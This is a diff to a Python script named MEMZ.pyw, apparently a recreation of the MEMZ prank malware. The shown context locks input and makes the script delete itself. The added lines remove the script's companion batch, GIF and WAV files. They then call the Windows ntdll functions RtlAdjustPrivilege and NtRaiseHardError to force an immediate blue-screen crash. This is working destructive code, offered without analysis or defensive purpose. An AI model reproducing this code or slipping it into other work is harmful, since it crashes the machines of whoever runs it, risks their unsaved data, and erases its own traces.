@@ -54,3 +54,31 @@ def lock_input():
 threading.Thread(target=lock_input).start()
 os.remove(__file__)
 root.mainloop()
+# tkinter has been closed, bluescreen time
+
+# clear up the other files created
+os.remove(__file__.replace("MEMZ.pyw", "MEMZ.bat"))
+os.remove(__file__.replace("MEMZ.pyw", "temp_nyan.gif"))
+os.remove(__file__.replace("MEMZ.pyw", "temp_nyan.wav"))
+
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
+nullptr = POINTER(c_int)()
+windll.ntdll.RtlAdjustPrivilege(
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int())
+)
+windll.ntdll.NtRaiseHardError(
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint())
+)
